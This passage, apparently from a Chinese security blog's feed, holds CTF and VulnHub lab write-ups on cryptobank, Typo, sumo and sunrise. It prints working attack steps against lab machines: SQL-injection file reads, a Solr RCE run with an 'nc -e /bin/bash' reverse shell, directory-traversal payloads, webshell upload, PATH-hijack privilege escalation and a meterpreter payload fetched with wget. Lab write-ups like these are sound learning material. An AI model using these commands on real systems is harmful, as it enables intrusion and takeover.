class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之前有扫到后台</p><p><img src="image-20200621173505621.png" alt></p><p>尴尬的是密码不会解密，吐了，看了别人的 <a href="https://www.jianshu.com/p/c3caef7031e3" target="_blank" rel="noopener">WP</a></p><p>下载 panel.php 文件即可的得到 flag ，还是要细才行，当时扫出登陆页面就没管了……</p><pre class="line-numbers language-shell"><code class="language-shell">D:\sqlmap>py -3 sqlmap.py -u "http://docker.hackthebox.eu:32382/portfolio.php?id=3" --batch -dbms=mysql --file-read=/var/www/html/administrat/panel.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hackTheBox </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cryptobank</title>
      <link href="/2020/06/06/vulnhub-cryptobank/"/>
      <url>/2020/06/06/vulnhub-cryptobank/</url>
      
        <content type="html"><![CDATA[<p>靶机ip：192.168.232.152</p><p>kali ip：192.168.232.153</p><blockquote><p>  nmap 扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nmap -sV 192.168.232.152Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 22:56 EDTNmap scan report for bogon (192.168.232.152)Host is up (0.00039s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 6.90 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  dirb 目录探测</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ dirb http://192.168.232.152/==> DIRECTORY: http://192.168.232.152/assets/                                             + http://192.168.232.152/development (CODE:401|SIZE:462)                                 + http://192.168.232.152/index.html (CODE:200|SIZE:33527)                                 + http://192.168.232.152/info.php (CODE:200|SIZE:86257)                                  + http://192.168.232.152/server-status (CODE:403|SIZE:280)                               ==> DIRECTORY: http://192.168.232.152/trade/                                             ---- Entering directory: http://192.168.232.152/assets/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode '-w' if you want to scan it anyway)---- Entering directory: http://192.168.232.152/trade/ ----+ http://192.168.232.152/trade/index.php (CODE:200|SIZE:2447) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>info.php 为网站配置，/trade/index.php 存在sql注入</p><blockquote><p>  sqlmap 执行注入</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell"># 得到一堆姐结果 随便找一个账户进入登陆页面，进去后发现没啥用！# juliusthedeveloper:wJWm4CgV26 这条记录值得注意<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据 dirb 扫描结果有一个返回状态码 401 的目录 development/ </p><p><img src="image-20200606111051273.png" alt></p><p>输入上述密码，不能通过验证</p><p>在主页找到开发者板块，发现各个邮箱图标对应的url包含的文件名可能为开发者用户名</p><p><img src="image-20200606111513077.png" alt></p><p><img src="image-20200606111547218.png" alt></p><pre class="line-numbers language-shell"><code class="language-shell"># julius.b:wJWm4CgV26 这条记录可以通过验证<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>默认页面没有什么东西</p><p><img src="image-20200606111801008.png" alt></p><blockquote><p>  dirb 对 development 目录进行扫描</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ dirb http://192.168.232.152/development -u julius.b:wJWm4CgV26-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Sat Jun  6 01:35:04 2020URL_BASE: http://192.168.232.152/development/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txtAUTHORIZATION: julius.b:wJWm4CgV26-----------------GENERATED WORDS: 4612                                                     ---- Scanning URL: http://192.168.232.152/development/ ----==> DIRECTORY: http://192.168.232.152/development/backups/                               + http://192.168.232.152/development/index.html (CODE:200|SIZE:21)                       + http://192.168.232.152/development/php.ini (CODE:200|SIZE:109)                         ==> DIRECTORY: http://192.168.232.152/development/tools/                   ---- Entering directory: http://192.168.232.152/development/backups/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                            (Use mode '-w' if you want to scan it anyway)  ---- Entering directory: http://192.168.232.152/development/tools/ ----+ http://192.168.232.152/development/tools/index.php (CODE:403|SIZE:690)   ==> DIRECTORY: http://192.168.232.152/development/tools/Resources/         ---- Entering directory: http://192.168.232.152/development/tools/Resources/ ----(!) WARNING: Directory IS LISTABLE. No need to scan it.                       (Use mode '-w' if you want to scan it anyway)-----------------END_TIME: Sat Jun  6 01:35:18 2020DOWNLOADED: 9224 - FOUND: 3kali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问  <code>http://192.168.232.152/development/tools/</code></p><p><img src="image-20200606133701657.png" alt></p><p>看到一个文件上传，试了很久没成功，看大佬的做法，有一个文件包含结合phpinfo可以搞</p><p><img src="image-20200606133931828.png" alt></p><p>找相关脚本，并修改相关内容</p><p><img src="image-20200606134237623.png" alt></p><p><img src="image-20200606134120527.png" alt></p><p>执行脚本，拿到shell</p><p><img src="image-20200606134707323.png" alt></p><blockquote><p>  提权</p></blockquote><p>查看网卡，发现一个docker网卡</p><p><img src="image-20200606135002535.png" alt></p><p>尝试寻找docker开启了哪些容器，是否暴露了哪些端口</p><p><img src="image-20200606135336840.png" alt></p><p>172.17.0.1这也是一个内外ip，这应该是docker开启的一个容器，8983是solr的端口，没法直接访问，利用 revsocks 将它代理出来看看</p><pre class="line-numbers language-shell"><code class="language-shell"># ./revsocks_linux_amd64 -listen :8089 -socks 0.0.0.0:16671 -pass cryptobank 监听端# ./revsocks_linux_amd64 -connect 192.168.232.153:8089 -pass cryptobank 靶机执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>浏览器访问（先设置代理端口）</p><p><img src="image-20200606145803512.png" alt></p><blockquote><p>  利用 solr 提权</p></blockquote><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ searchsploit solr----------------------------------------------------------- --------------------------------- Exploit Title                                             |  Path----------------------------------------------------------- ---------------------------------Apache Solr - Remote Code Execution via Velocity Template  | multiple/remote/48338.rbApache Solr 7.0.1 - XML External Entity Expansion / Remote | xml/webapps/43009.txtApache Solr 8.2.0 - Remote Code Execution                  | java/webapps/47572.pySolr 3.5.0 - Arbitrary Data Deletion                       | java/webapps/39418.txt----------------------------------------------------------- ---------------------------------Shellcodes: No Resultskali@kali:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ proxychains python3 47572.py 172.17.0.1 8983 "nc -e /bin/bash 192.168.232.153 6685"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell"><code class="language-shell">kali@kali:~$ nc -lvp 6685listening on [any] 6685 ...Warning: forward host lookup failed for bogon: No address associated with nameconnect to [192.168.232.153] from bogon [192.168.232.152] 33714pwd/opt/solr/serverpython -c 'import pty;pty.spawn("/bin/bash")'solr@33fa86e6105f:/opt/solr/server$ solr@33fa86e6105f:/opt/solr/server$ cd /cd /solr@33fa86e6105f:/$ lslsbin   docker-entrypoint-initdb.d  lib    mnt   root  srv  usrboot  etc                         lib64  opt   run   sys  vardev   home                        media  proc  sbin  tmpsolr@33fa86e6105f:/$ sudo su rootsudo su root[sudo] password for solr: solrroot@33fa86e6105f:/# ididuid=0(root) gid=0(root) groups=0(root)root@33fa86e6105f:/# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确实也拿到了，root下的flag，但是是在docker容器内部的root，怎么拿下宿主机的root，还不会……</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typo</title>
      <link href="/2020/05/30/vulnhub-typo/"/>
      <url>/2020/05/30/vulnhub-typo/</url>
      
        <content type="html"><![CDATA[<p>又被打击了，我还是很菜啊，cao ！</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nmap 192.168.232.151Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-30 04:05 EDTNmap scan report for bogon (192.168.232.151)Host is up (0.00088s latency).Not shown: 995 closed portsPORT     STATE SERVICE22/tcp   open  ssh80/tcp   open  http8000/tcp open  http-alt8080/tcp open  http-proxy8081/tcp open  blackice-icecapMAC Address: 00:0C:29:D2:A6:DE (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.46 secondsroot@kali:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用目录扫描一个端口一个端口的扫，扫出来两个可能有用的界面</p><p><img src="1.png" alt></p><p><img src="2.png" alt></p><p>typo3 后台界面弱口令试了一下进不去。对phpmyadmin后台做弱口令测试 root:root 进入后台，到这里似乎一起都很美好，然后网上到处找getshell方法，都不行！</p><p><img src="3.jpg" alt></p><p>真的让人悲伤，自信心再一次收到了打击……无奈只好翻阅大佬的  <strong><a href="https://www.hacknos.com/typo-1-walkthrough-vulnhub/" target="_blank" rel="noopener">博客</a></strong>  ，跟着大佬的步骤做下去</p><p><img src="4.png" alt></p><p>原来将这里的用户密码替换掉就可以了，我当时还看过这表，由于不知道是个啥加密就没管，简直菜的不行~</p><p><img src="5.jpg" alt></p><p>有多学了一种加密方式，奇怪的知识又增加了  <strong><a href="https://argon2.online/" target="_blank" rel="noopener">Argon2 Hash </a></strong>  利用这个网站可以生成一个自定义的字符串的加密结果，我加密的的字符是“aling”</p><p><img src="6.png" alt></p><p>将加密结果复制下来替换掉admin的password字段，登陆typo3 后台</p><p><img src="7.png" alt></p><p>上传木马：Settings -&gt; Configure options -&gt; Backend[BE] 找到下图字段，把php后缀的限制删除，就可以上传.php文件了</p><p><img src="8.png" alt></p><p>上传木马发弹 shell，利用 apache2-restart 提权，又是涨芝士的一天~</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nc -lp 6666Linux typo 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux 14:14:58 up  3:36,  0 users,  load average: 0.00, 0.01, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can't access tty; job control turned off$ $ python3 -c 'import pty;pty.spawn("/bin/bash")'www-data@typo:/$ www-data@typo:/$ find -perm -4000 -print 2>/dev/null   # 查找具有suid权限的2进制文件find -perm -4000 -print 2>/dev/null./usr/bin/mount./usr/bin/newgrp./usr/bin/chfn./usr/bin/su./usr/bin/gpasswd./usr/bin/chsh./usr/bin/umount./usr/bin/passwd./usr/lib/dbus-1.0/dbus-daemon-launch-helper./usr/lib/eject/dmcrypt-get-device./usr/lib/openssh/ssh-keysign./usr/local/bin/apache2-restart     # 可以提权的文件./usr/local/bin/phpunit     # 也可以用于提权，没试过www-data@typo:/$ apache2-restartapache2-restartwww-data@typo:/$ www-data@typo:/$ whereis apache2-restartwhereis apache2-restartapache2-restart: /usr/local/bin/apache2-restartwww-data@typo:/$ strings /usr/local/bin/apache2-restartstrings /usr/local/bin/apache2-restart/lib64/ld-linux-x86-64.so.25q;Xq__gmon_start__libc.so.6setresgidsetresuidsystem__libc_start_mainGLIBC_2.2.5fff.fffff.l$ Lt$(L|$0Hservice apache2 start       # service 会使用root权限GCC: (Debian 4.4.5-8) 4.4.5.symtab.strtab.shstrtab.interp...www-data@typo:/$ www-data@typo:/$ cd /tmpcd /tmpwww-data@typo:/tmp$ www-data@typo:/tmp$ echo "/bin/bash" > serviceecho "/bin/bash" > servicewww-data@typo:/tmp$ www-data@typo:/tmp$ lslsservicewww-data@typo:/tmp$ chmod a+x servicechmod a+x servicewww-data@typo:/tmp$ ls -lhls -lhtotal 4.0K-rwxrwxrwx 1 www-data www-data 10 May 30 14:20 servicewww-data@typo:/tmp$ www-data@typo:/tmp$ export PATH=/tmp/:$PATHexport PATH=/tmp/:$PATHwww-data@typo:/tmp$ www-data@typo:/tmp$ echo $PATHecho $PATH/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binwww-data@typo:/tmp$ www-data@typo:/tmp$ apache2-restartapache2-restartroot@typo:/tmp# root@typo:/tmp# whoamiwhoamirootroot@typo:/tmp# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>总结？</strong></p><p>正常人能写总结吗？写在最后的话能是心里话吗？</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sumo</title>
      <link href="/2020/05/26/vulnhub-sumo/"/>
      <url>/2020/05/26/vulnhub-sumo/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# nmap -sV 192.168.232.147Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 20:47 EDTNmap scan report for bogon (192.168.232.147)Host is up (0.0053s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))MAC Address: 00:0C:29:E9:4C:8E (VMware)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submNmap done: 1 IP address (1 host up) scanned in 7.69 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还是老样子，枚举了一波ssh用户然后爆破，无果……。丝毫不慌，室友的人生观让我触动，他高唱着<em>人生短短急个球啊~不醉不罢休！</em></p><p>访问了一下80端口，啥也没有</p><p><img src="1.PNG" alt></p><p>简单扫了一下目录</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~# dirb http://192.168.232.147/-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Mon May 25 21:02:33 2020URL_BASE: http://192.168.232.147/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                       ---- Scanning URL: http://192.168.232.147/ ----+ http://192.168.232.147/cgi-bin/ (CODE:403|SIZE:291)                                   + http://192.168.232.147/index (CODE:200|SIZE:177)                                      + http://192.168.232.147/index.html (CODE:200|SIZE:177)                                 + http://192.168.232.147/server-status (CODE:403|SIZE:296)                 -----------------END_TIME: Mon May 25 21:02:37 2020DOWNLOADED: 4612 - FOUND: 4root@kali:~# <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到一个 <code>cgi-bin</code> 目录，虽然无权访问，但我觉得她有问题（凭借我闻香识妹子的嗅觉~）。去搜一下，以我一流的英语2级水平找到了一篇 <strong><a href="https://null-byte.wonderhowto.com/how-to/exploit-shellshock-web-server-using-metasploit-0186084/" target="_blank" rel="noopener">文章</a></strong> 里的利用方法</p><p><img src="2.PNG" alt></p><pre class="line-numbers language-shell"><code class="language-shell">msf5 > use exploit/multi/http/apache_mod_cgi_bash_env_execmsf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show missingModule options (exploit/multi/http/apache_mod_cgi_bash_env_exec):   Name       Current Setting  Required  Description   ----       ---------------  --------  -----------   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'   TARGETURI                   yes       Path to CGI scriptmsf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhost 192.168.232.147rhost => 192.168.232.147msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/test/test.cgitargeturi => /cgi-bin/test/test.cgimsf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run[*] Started reverse TCP handler on 192.168.232.146:4444 [*] Command Stager progress - 100.46% done (1097/1092 bytes)[*] Sending stage (980808 bytes) to 192.168.232.147[*] Meterpreter session 1 opened (192.168.232.146:4444 -> 192.168.232.147:58903) at 2020-05-25 21:51:56 -0400meterpreter > meterpreter > getuidServer username: no-user @ ubuntu (uid=33, gid=33, euid=33, egid=33)meterpreter > <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>  提权</p></blockquote><p>系统是 ubuntu 12.04 ，利用系统版本漏洞提权失败</p><p>我也不知到在exploit-db上搞得提权脚本咋就不好使……试了好多次，先放弃~。</p><p>未完待续……</p><p><img src="3.jpeg" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sunrise</title>
      <link href="/2020/05/22/vulnhub-sunrise/"/>
      <url>/2020/05/22/vulnhub-sunrise/</url>
      
        <content type="html"><![CDATA[<p>又是<em>*</em>的一天  </p><p><img src="1.jpg" alt></p><p>打开靶机 sunrise，我已经不再为寻找靶机的ip而苦恼，我发现vmware这个软件的nat模式分配IP好像是递增的分配的，比如我的kali ip是192.168.232.130，这时我新创建一个靶机，用nat模式，他的ip就是192.168.232.131。当然这可能没什么用……</p><p>好了开始，第一步还是上nmap</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# nmap -sV -sS 192.168.232.136Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 22:07 EDTNmap scan report for bogon (192.168.232.136)Host is up (0.00019s latency).Not shown: 997 closed portsPORT     STATE SERVICE    VERSION22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)80/tcp   open  http       Apache httpd 2.4.38 ((Debian))8080/tcp open  http-proxy Weborf <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我还是太菜了，看到ssh就去爆破了一波结果一无所获，真的天真啊，想想密码也应该是那种好几十为的组合啊。</p><p>漫无目的的访问了80，没看出个啥</p><p><img src="2.png" alt></p><p>但是刚刚nmap扫出来apache的版本，去找找有莫有相关的漏洞</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# searchsploit Apache 2.4.38 --------------------------------------------- ------------------------------------ Exploit Title                               |  Path                                             | (/usr/share/exploitdb/)--------------------------------------------- ------------------------------------Apache 2.4.17 < 2.4.38 - 'apache2ctl gracefu | exploits/linux/local/46676.php--------------------------------------------- ------------------------------------Shellcodes: No Result<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>找到一个脚本，看了一下用法，这是个用来提权的脚本，要传到服务器上才能用，先放一放</p><p>去看看8080端口，有一个weborf，我其实是不知道这个diao玩意儿的，开始就错过了它，看了解答才知道到，这是个突破口！还是太菜啊</p><p><img src="3.png" alt></p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# searchsploit weborf 0.12.2--------------------------------------------- ------------------------------------ Exploit Title                               |  Path                                             | (/usr/share/exploitdb/)--------------------------------------------- ------------------------------------weborf 0.12.2 - Directory Traversal          | exploits/linux/remote/14925.txt--------------------------------------------- ------------------------------------<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看漏洞利用的方法</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# cat 14925.txt Title: Weborf httpd <= 0.12.2 Directory Traversal VulnerabilityDate: Sep 6, 2010Author: RewLink: http://galileo.dmi.unict.it/wiki/weborf/doku.phpVersion: 0.12.2Tested On: Debian 5CVE: N/A=============================================================Weborf httpd <= 0.12.2 suffers a directory traversalvulnerability.  This vulnerability could allowattackers to read arbitrary files and hak th3 plan3t.instance.c : line 240-244------------------------------void modURL(char* url) {    //Prevents the use of .. to access the whole filesystem  <-- ORLY?    strReplace(url,"../",'\0');    replaceEscape(url);------------------------------Exploit: GET /..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd==============================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用 <code>searchsploit -m id</code> 就可以吧，漏洞利用的文件拷贝到当前路径，id就是文件名字前面的数字，比如这里的 14925</p><p>看到这是一个文件遍历的漏洞。试试这个payload</p><p><img src="4.png" alt></p><p>看到是可以利用的，下面照葫芦画瓢，看看其他文件的内容，比如家目录，里面有两个用户的文件，就是上图标出的用户。sunrise目录下有个 user.txt，里面记录了一串hash值，解密没得到结果，猜测这可能是sunrise用户的密码。</p><p><img src="5.png" alt></p><p>看看weborf目录的内容，可见的只有一个目录，但是考虑到，可能存在隐藏文件，比如.ssh，这样的文件，所以用工具跑一下（其实开始没想到这个，看了别人的思路恍然大悟，这也是一个很好的思路，小本本掏出来记录一下）</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# dirb http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f-----------------DIRB v2.22    By The Dark Raver-----------------START_TIME: Thu May 14 23:01:50 2020URL_BASE: http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt-----------------GENERATED WORDS: 4612                                                       ---- Scanning URL: http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/ ----+ http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.bashrc (CODE:200|SIZE:3526)                + http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.mysql_history (CODE:200|SIZE:83)           + http://192.168.232.136:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fhome%2fweborf%2f/.profile (CODE:200|SIZE:807)                                                                                               e%2fweborf%2f/zt                               -----------------END_TIME: Thu May 14 23:02:21 2020DOWNLOADED: 4612 - FOUND: 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>.mysql_history是我们感兴趣的内容，除此之外还有 girls</p><p><img src="6.png" alt></p><p>这一瞬间感觉遇到了”爱情”！</p><pre class="line-numbers language-shell"><code class="language-shell">root@kali:~/Desktop# ssh weborf@192.168.232.136 The authenticity of host '192.168.232.136 (192.168.232.136)' can't be established.ECDSA key fingerprint is SHA256:4yaOo7mwlBs//3V1VVqqtiApksgelyI4AJwhIUfz0UQ.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '192.168.232.136' (ECDSA) to the list of known hosts.weborf@192.168.232.136's password: Linux sunrise 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun May 10 05:27:08 2020 from 192.168.232.130weborf@sunrise:~$ weborf@sunrise:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>试了一下，这个用户啥也干不了，记得 .mysql_history 让人想起mysql 尝试用 weborf 用户登陆，发现是可以登陆的，而且里面记录了root 和 sunrise用户的密码。root的密码hash值，解密了一下尼玛要钱（这就是vip玩家和普通玩家的区别，vip玩家充钱直接拿root密码。我这样的屌丝玩家只能找找别的出路）。但是sunrise用户的密码是明文 ‘’thefutureissobrightigottawearshades”</p><p>切换到sunrise用户看看能不能做点什么</p><pre class="line-numbers language-shell"><code class="language-shell">sunrise@sunrise:~$ iduid=1000(sunrise) gid=1000(sunrise) groups=1000(sunrise),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner)sunrise@sunrise:~$ sunrise@sunrise:~$ sunrise@sunrise:~$ sudo -l[sudo] password for sunrise: Matching Defaults entries for sunrise on sunrise:    env_reset, mail_badpass,    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser sunrise may run the following commands on sunrise:    (root) /usr/bin/winesunrise@sunrise:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现可以利用 wine 提权，这可不是酒，它是一个可以让windows的应用在liunx 上执行的神奇东西，比如wine QQ. </p><p>思路：在靶机上执行一个windows的的木马程序来完成提权，这样的木马有很多，我们跟着大佬的步伐用msfpc 生成一个</p><p><code>msfpc windows 192.168.232.130</code> ip是kali的，这里生成的是一个反弹shell，执行完后会有一个，”.exe“ 文件，下一步就是把这个文件放到靶机里去。</p><p>在kali生成木马的目录下，执行：<code>python2 -m SimpleHTTPServer 8080</code> 好奇这条命令是干嘛用的，直接用浏览器访问一下kali的8080端口就知道了。</p><p>在靶机的shell利用wget工具下载木马</p><pre class="line-numbers language-shell"><code class="language-shell">sunrise@sunrise:~$ wget http://192.168.232.130:8080/windows-meterpreter-staged-reverse-tcp-443.exe--2020-05-15 02:32:19--  http://192.168.232.130:8080/windows-meterpreter-staged-reverse-tcp-443.exeConnecting to 192.168.232.130:8080... connected.HTTP request sent, awaiting response... 200 OKLength: 73802 (72K) [application/x-msdos-program]Saving to: ‘windows-meterpreter-staged-reverse-tcp-443.exe’windows-meterpreter-s 100%[=======================>]  72.07K  --.-KB/s    in 0s      2020-05-15 02:32:19 (237 MB/s) - ‘windows-meterpreter-staged-reverse-tcp-443.exe’ saved [73802/73802]sunrise@sunrise:~$ lsDesktop    Downloads  Pictures  Templates  VideosDocuments  Music      Public    user.txt   windows-meterpreter-staged-reverse-tcp-443.exesunrise@sunrise:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>木马已经在靶机上了，下一步就是kali，启动监听，靶机运行木马</p><p><code>sudo wine windows-meterpreter-staged-reverse-tcp-443.exe</code></p><p>kali端的监听还是记录一哈吧，老是忘</p><p><img src="7.gif" alt></p><pre class="line-numbers language-shell"><code class="language-shell">msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload => windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) > set lhost 192.168.232.130lhost => 192.168.232.130msf5 exploit(multi/handler) > set lport 443lport => 443msf5 exploit(multi/handler) > exploit -j           #  -j，后台运行[*] Exploit running as background job 1.[*] Exploit completed, but no session was created.[*] Started reverse TCP handler on 192.168.232.130:443  msf5 exploit(multi/handler) > [*] 